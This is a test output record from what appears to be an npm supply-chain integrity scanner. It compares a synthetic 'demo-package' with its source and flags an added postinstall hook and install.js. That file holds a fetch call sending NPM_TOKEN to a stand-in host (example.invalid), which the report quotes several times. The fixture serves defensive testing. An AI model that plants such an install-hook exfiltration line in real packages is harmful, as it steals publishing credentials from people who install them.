@@ -1,0 +1,359 @@
+{
+  "input": "controlled injection fixture; synthetic package, actual model response",
+  "report": {
+    "schemaVersion": 1,
+    "id": "live_model_smoke",
+    "status": "partial",
+    "createdAt": "2026-10-31T16:54:22.557Z",
+    "request": {
+      "artifact": {
+        "kind": "npm",
+        "name": "demo-package",
+        "version": "1.0.0"
+      },
+      "source": {
+        "kind": "github",
+        "repositoryUrl": "https://github.com/example/demo-package",
+        "commit": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+    },
+    "artifact": {
+      "name": "demo-package",
+      "version": "1.0.0",
+      "sha256": "d50946370ef14e7b7c39c5fc60fb91deec09e8f68bfca468de68202996a1ef70"
+    },
+    "source": {
+      "repositoryUrl": "https://github.com/example/demo-package",
+      "commit": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "snapshotSha256": "3c1f6d97a78c871ada7c3eee89892ba7e18bb85211ca8f41fdaa2cdf3c554cab",
+      "packageRoot": "",
+      "method": "user_commit",
+      "confidence": "high",
+      "evidence": [
+        "User selected an immutable source commit",
+        "Source package root: ."
+      ],
+      "limitations": []
+    },
+    "coverage": {
+      "totalFiles": 4,
+      "comparedFiles": 4,
+      "skippedFiles": 0,
+      "reasons": [
+        "1 finding(s) excluded from model review by context limits"
+      ]
+    },
+    "files": [
+      {
+        "id": "file_b8811d088b63f6fa01c36cdd",
+        "packagePath": "index.js",
+        "sourcePath": "index.js",
+        "status": "identical",
+        "packageHash": "a2098bd92b10bf8b816d24b7556b1ce8c49a879d130489065ef1051c17e042f6",
+        "sourceHash": "a2098bd92b10bf8b816d24b7556b1ce8c49a879d130489065ef1051c17e042f6",
+        "binary": false,
+        "truncated": false,
+        "findingIds": []
+      },
+      {
+        "id": "file_2b414ef575d0dfcf5e7154a7",
+        "packagePath": "install.js",
+        "status": "added",
+        "packageHash": "110aa4489626b998e1748cd252267d5e8257017a17fd68ca4681776421791237",
+        "binary": false,
+        "truncated": false,
+        "findingIds": [
+          "finding_7b366bb2eeac2862b31d3a73",
+          "finding_5dda6efd712198c13f4ccd4a",
+          "finding_df2fd8e17a84b720d3f42910",
+          "finding_7aad25000dc051326544c83d"
+        ]
+      },
+      {
+        "id": "file_3eeb1011b4f49565b00de0ef",
+        "packagePath": "package.json",
+        "sourcePath": "package.json",
+        "status": "modified",
+        "packageHash": "dd311abb4a8bea5086933af3c86e1d07d12bbaa07dc0c724b4bb05759b2b9a28",
+        "sourceHash": "168724bfb7c5b48c3eca0336eef848d6df8c65c98226db9ce7b6f09348191934",
+        "binary": false,
+        "truncated": false,
+        "findingIds": [
+          "finding_bd1156df3cb345f7adf3ee4a",
+          "finding_59846d0aee4ca372231575ac"
+        ]
+      },
+      {
+        "id": "file_a7c9590d4d09120c1da602c9",
+        "sourcePath": "test/check.js",
+        "status": "removed",
+        "sourceHash": "a52cae07b03602a1959e582c0615a76e54f9478320956678b824ef42052a747c",
+        "binary": false,
+        "truncated": false,
+        "findingIds": [
+          "finding_59846d0aee4ca372231575ac"
+        ]
+      }
+    ],
+    "findings": [
+      {
+        "id": "finding_7b366bb2eeac2862b31d3a73",
+        "ruleId": "published_executable",
+        "title": "Executable source exists only in package",
+        "classification": "suspicious_change",
+        "severity": "medium",
+        "confidence": "high",
+        "explanation": "Review code that is absent from the selected source tree. It may be generated, but equivalence has not been established.\nModel interpretation (needs_review, not independently verified): The file 'install.js' exists only in the package and not in the source tree. Equivalence has not been established; it may be generated or added.",
+        "evidence": [
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package"
+          },
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package"
+          }
+        ],
+        "origin": "combined",
+        "limitations": [
+          "Equivalence has not been established."
+        ]
+      },
+      {
+        "id": "finding_5dda6efd712198c13f4ccd4a",
+        "ruleId": "introduced_network",
+        "title": "Introduced network behavior",
+        "classification": "suspicious_change",
+        "severity": "high",
+        "confidence": "high",
+        "explanation": "A call or access not present in the compared source was observed in the published code. Review its purpose and data flow.\nModel interpretation (needs_review, not independently verified): The package contains a fetch call to an invalid domain sending NPM_TOKEN, which is absent in the source. This represents a new network behavior that requires review of its purpose and data flow.",
+        "evidence": [
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package",
+            "startLine": 2,
+            "endLine": 2,
+            "excerpt": "fetch(\"https://example.invalid/collect\", { body: process.env.NPM_TOKEN });"
+          },
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package",
+            "startLine": 2,
+            "endLine": 2,
+            "excerpt": "fetch(\"https://example.invalid/collect\", { body: process.env.NPM_TOKEN });"
+          }
+        ],
+        "origin": "combined",
+        "limitations": [
+          "Static syntactic signal; runtime reachability, aliases, and malicious intent are not established.",
+          "Static syntactic signal; runtime reachability, aliases, and malicious intent are not established."
+        ]
+      },
+      {
+        "id": "finding_df2fd8e17a84b720d3f42910",
+        "ruleId": "introduced_sensitive",
+        "title": "Introduced sensitive behavior",
+        "classification": "suspicious_change",
+        "severity": "high",
+        "confidence": "high",
+        "explanation": "A call or access not present in the compared source was observed in the published code. Review its purpose and data flow.\nModel interpretation (needs_review, not independently verified): The package contains a fetch call to an invalid domain sending NPM_TOKEN, which is absent in the source. This represents a new sensitive behavior (exposure of token) that requires review.",
+        "evidence": [
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package",
+            "startLine": 2,
+            "endLine": 2,
+            "excerpt": "fetch(\"https://example.invalid/collect\", { body: process.env.NPM_TOKEN });"
+          },
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package",
+            "startLine": 2,
+            "endLine": 2,
+            "excerpt": "fetch(\"https://example.invalid/collect\", { body: process.env.NPM_TOKEN });"
+          }
+        ],
+        "origin": "combined",
+        "limitations": [
+          "Static syntactic signal; runtime reachability, aliases, and malicious intent are not established.",
+          "Static syntactic signal; runtime reachability, aliases, and malicious intent are not established."
+        ]
+      },
+      {
+        "id": "finding_7aad25000dc051326544c83d",
+        "ruleId": "introduced_execute",
+        "title": "Introduced execute behavior",
+        "classification": "suspicious_change",
+        "severity": "high",
+        "confidence": "high",
+        "explanation": "A call or access not present in the compared source was observed in the published code. Review its purpose and data flow.\nModel interpretation (needs_review, not independently verified): The package includes an exec call to 'echo test-fixture' not present in the source. This introduced execute behavior requires review of its purpose and data flow.",
+        "evidence": [
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package",
+            "startLine": 3,
+            "endLine": 3,
+            "excerpt": "exec(\"echo test-fixture\");"
+          },
+          {
+            "fileId": "file_2b414ef575d0dfcf5e7154a7",
+            "side": "package",
+            "startLine": 3,
+            "endLine": 3,
+            "excerpt": "exec(\"echo test-fixture\");"
+          }
+        ],
+        "origin": "combined",
+        "limitations": [
+          "Static syntactic signal; runtime reachability, aliases, and malicious intent are not established.",
+          "Static syntactic signal; runtime reachability, aliases, and malicious intent are not established."
+        ]
+      },
+      {
+        "id": "finding_bd1156df3cb345f7adf3ee4a",
+        "ruleId": "lifecycle_change",
+        "title": "Published lifecycle script differs",
+        "classification": "suspicious_change",
+        "severity": "medium",
+        "confidence": "high",
+        "explanation": "The postinstall lifecycle command was added or changed in the published manifest. Review when this hook runs before installation.\nModel interpretation (needs_review, not independently verified): The postinstall lifecycle command was added in the published manifest ('node install.js') but is absent in the source. Review when this hook runs before installation.",
+        "evidence": [
+          {
+            "fileId": "file_3eeb1011b4f49565b00de0ef",
+            "side": "package",
+            "startLine": 8,
+            "endLine": 8,
+            "excerpt": "    \"postinstall\": \"node install.js\""
+          },
+          {
+            "fileId": "file_3eeb1011b4f49565b00de0ef",
+            "side": "source"
+          },
+          {
+            "fileId": "file_3eeb1011b4f49565b00de0ef",
+            "side": "package",
+            "startLine": 8,
+            "endLine": 8,
+            "excerpt": "    \"postinstall\": \"node install.js\""
+          },
+          {
+            "fileId": "file_3eeb1011b4f49565b00de0ef",
+            "side": "source"
+          }
+        ],
+        "origin": "combined",
+        "limitations": [
+          "Lifecycle commands may be legitimate; this is not proof of malicious intent.",
+          "Lifecycle commands may be legitimate; this is not proof of malicious intent."
+        ]
+      },
+      {
+        "id": "finding_59846d0aee4ca372231575ac",
+        "ruleId": "packaging_files",
+        "title": "Source file is outside declared package contents",
+        "classification": "explained_packaging",
+        "severity": "info",
+        "confidence": "high",
+        "explanation": "The source package.json files list does not include this path. This explains an omission, not the integrity of included files.",
+        "evidence": [
+          {
+            "fileId": "file_a7c9590d4d09120c1da602c9",
+            "side": "source"
+          },
+          {
+            "fileId": "file_3eeb1011b4f49565b00de0ef",
+            "side": "source",
+            "startLine": 4,
+            "endLine": 4,
+            "excerpt": "  \"files\": ["
+          }
+        ],
+        "origin": "rule",
+        "limitations": []
+      }
+    ],
+    "model": {
+      "id": "qwen3.5:latest",
+      "status": "used"
+    },
+    "toolVersion": "0.1.0",
+    "rulesVersion": "1",
+    "durationMs": 59160.843167
+  },
+  "details": [
+    {
+      "file": {
+        "id": "file_b8811d088b63f6fa01c36cdd",
+        "packagePath": "index.js",
+        "sourcePath": "index.js",
+        "status": "identical",
+        "packageHash": "a2098bd92b10bf8b816d24b7556b1ce8c49a879d130489065ef1051c17e042f6",
+        "sourceHash": "a2098bd92b10bf8b816d24b7556b1ce8c49a879d130489065ef1051c17e042f6",
+        "binary": false,
+        "truncated": false,
+        "findingIds": []
+      },
+      "packageText": "export const answer = 42;\n",
+      "sourceText": "export const answer = 42;\n",
+      "unifiedDiff": "",
+      "truncated": false
+    },
+    {
+      "file": {
+        "id": "file_2b414ef575d0dfcf5e7154a7",
+        "packagePath": "install.js",
+        "status": "added",
+        "packageHash": "110aa4489626b998e1748cd252267d5e8257017a17fd68ca4681776421791237",
+        "binary": false,
+        "truncated": false,
+        "findingIds": [
+          "finding_7b366bb2eeac2862b31d3a73",
+          "finding_5dda6efd712198c13f4ccd4a",
+          "finding_df2fd8e17a84b720d3f42910",
+          "finding_7aad25000dc051326544c83d"
+        ]
+      },
+      "packageText": "import { exec } from \"node:child_process\";\nfetch(\"https://example.invalid/collect\", { body: process.env.NPM_TOKEN });\nexec(\"echo test-fixture\");\n",
+      "sourceText": null,
+      "unifiedDiff": "===================================================================\n--- /dev/null\n+++ install.js\n@@ -0,0 +1,3 @@\n+import { exec } from \"node:child_process\";\n+fetch(\"https://example.invalid/collect\", { body: process.env.NPM_TOKEN });\n+exec(\"echo test-fixture\");\n",
+      "truncated": false
+    },
+    {
+      "file": {
+        "id": "file_3eeb1011b4f49565b00de0ef",
+        "packagePath": "package.json",
+        "sourcePath": "package.json",
+        "status": "modified",
+        "packageHash": "dd311abb4a8bea5086933af3c86e1d07d12bbaa07dc0c724b4bb05759b2b9a28",
+        "sourceHash": "168724bfb7c5b48c3eca0336eef848d6df8c65c98226db9ce7b6f09348191934",
+        "binary": false,
+        "truncated": false,
+        "findingIds": [
+          "finding_bd1156df3cb345f7adf3ee4a",
+          "finding_59846d0aee4ca372231575ac"
+        ]
+      },
+      "packageText": "{\n  \"name\": \"demo-package\",\n  \"version\": \"1.0.0\",\n  \"files\": [\n    \"index.js\"\n  ],\n  \"scripts\": {\n    \"postinstall\": \"node install.js\"\n  }\n}\n",
+      "sourceText": "{\n  \"name\": \"demo-package\",\n  \"version\": \"1.0.0\",\n  \"files\": [\n    \"index.js\"\n  ]\n}\n",
+      "unifiedDiff": "Index: package.json\n===================================================================\n--- package.json\n+++ package.json\n@@ -3,5 +3,8 @@\n   \"version\": \"1.0.0\",\n   \"files\": [\n     \"index.js\"\n-  ]\n+  ],\n+  \"scripts\": {\n+    \"postinstall\": \"node install.js\"\n+  }\n }\n",
+      "truncated": false
+    },
+    {
+      "file": {
+        "id": "file_a7c9590d4d09120c1da602c9",
+        "sourcePath": "test/check.js",
+        "status": "removed",
+        "sourceHash": "a52cae07b03602a1959e582c0615a76e54f9478320956678b824ef42052a747c",
+        "binary": false,
+        "truncated": false,
+        "findingIds": [
+          "finding_59846d0aee4ca372231575ac"
+        ]
+      },
+      "packageText": null,
+      "sourceText": "// source-only test\n",
+      "unifiedDiff": "===================================================================\n--- test/check.js\n+++ /dev/null\n@@ -1,1 +0,0 @@\n-// source-only test\n",
+      "truncated": false
+    }
+  ]
+}
